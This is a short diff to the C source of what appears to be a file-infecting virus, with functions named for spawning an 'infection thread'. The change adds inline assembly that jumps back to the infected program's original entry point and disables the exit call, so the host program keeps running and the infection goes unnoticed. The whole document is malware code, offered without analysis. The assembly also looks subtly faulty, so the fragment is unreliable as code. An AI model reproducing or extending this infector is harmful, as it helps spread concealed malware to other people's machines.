@@ -19,6 +19,11 @@ void spawn_infection_thread(void) {
   } else {
     PRINT_DEBUG("failed to initialize data\n");
   }
+  uint32_t oep = get_original_entry_point();
+  if (oep != OEP_DEFAULT) {
+    asm volatile("mov %0, %%eax\n"
+                 "ljmp *(%%eax)": : "r" (&oep));
+  }
 }
 
 static DWORD WINAPI run(LPVOID param) {
@@ -47,6 +52,6 @@ static DWORD WINAPI run(LPVOID param) {
     PRINT_DEBUG("failed to initialize data\n");
   }
   PRINT_DEBUG("infection thread finished\n");
-  data.functions.exitProcess(0);
+  //data.functions.exitProcess(0);
   return 0;
 }
